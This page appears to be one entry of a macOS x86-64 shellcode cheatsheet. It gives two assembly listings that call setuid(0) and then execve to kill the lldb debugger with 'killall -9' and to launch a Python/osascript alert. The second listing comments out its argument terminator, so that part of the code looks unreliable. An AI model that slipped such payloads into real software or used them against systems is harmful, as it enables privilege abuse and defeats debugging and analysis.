<html>
    <head>
        <title>
            (iv) run shell script with arguments
        </title>
    </head>
    <body>
        x86-64 assembly/shellcode cheatsheet<br>
        (iv) run shell script with arguments<br>
        <br>
        runshell.s<br>
        <br>
        bits 64<br>
        global start<br>
        start:<br>
        mov rbp, rsp<br>
        sub rsp, 0x40<br>
        ;setuid(0) -> 0x17<br>
        mov rax, 0x2000017<br>
        xor rdi, rdi<br>
        syscall<br>
        ;execve(“/usr/bin/killall”, *[*], 0) -> 0x3b<br>
        mov rax, 0x200003b<br>
        mov rdi, msg<br>
        mov rbx, arg1<br>
        lea rsi, [rbp - 0x38]<br>
        mov rbx, arg1<br>
        mov qword [rbp - 0x18], rbx<br>
        mov qword [rbp - 0x38], rbx<br>
        mov rbx, arg2<br>
        mov qword [rbp - 0x30], rbx<br>
        mov rbx, arg3<br>
        mov qword [rbp - 0x28], rbx<br>
        mov dword [rbp - 0x20], 0x0<br>
        xor rdx, rdx<br>
        syscall<br>
        ;exit(0)<br>
        mov rax, 0x2000001<br>
        xor rdi, rdi<br>
        syscall<br>
        msg db “/usr/bin/killall”,0<br>
        arg1 db “killall”,0<br>
        arg2 db “-9”,0<br>
        arg3 db “lldb”,0<br>
        <br>
        If an array of pointers is required as arguments, we should put all the pointers into stack.<br>
        <br>
        Another example is to show an alert under OS X,<br>
        runapplescript.s<br>
        <br>
        bits 64<br>
        global start<br>
        start:<br>
        mov rbp, rsp<br>
        sub rsp, 0x40<br>
        ;setuid(0) -> 0x17<br>
        mov rax, 0x2000017<br>
        xor rdi, rdi<br>
        syscall<br>
        ;execve() -> 0x3b<br>
        mov rax, 0x200003b<br>
        mov rdi, msg<br>
        mov rbx, arg1<br>
        lea rsi, [rbp - 0x38]<br>
        mov rbx, arg1<br>
        mov qword [rbp - 0x18], rbx<br>
        mov qword [rbp - 0x38], rbx<br>
        mov rbx, arg2<br>
        mov qword [rbp - 0x30], rbx<br>
        mov rbx, arg3<br>
        mov qword [rbp - 0x28], rbx<br>
        ;mov dword [rbp - 0x20], 0x0<br>
        xor rdx, rdx<br>
        syscall<br>
        ;exit(0)<br>
        mov rax, 0x2000001<br>
        xor rdi, rdi<br>
        syscall<br>
        msg db “/usr/bin/python”,0<br>
        arg1 db “python”,0<br>
        arg2 db “-c”,0<br>
        arg3 db “import os;os.system(”,0x22,“osascript -e ”,0x5c,0x22,“display alert ”,0x5c,0x5c,0x5c,0x22,“i am a title”,0x5c,0x5c,0x5c,0x22,0x5c,0x22,0x22,“)”,0<br>
    </body>
</html>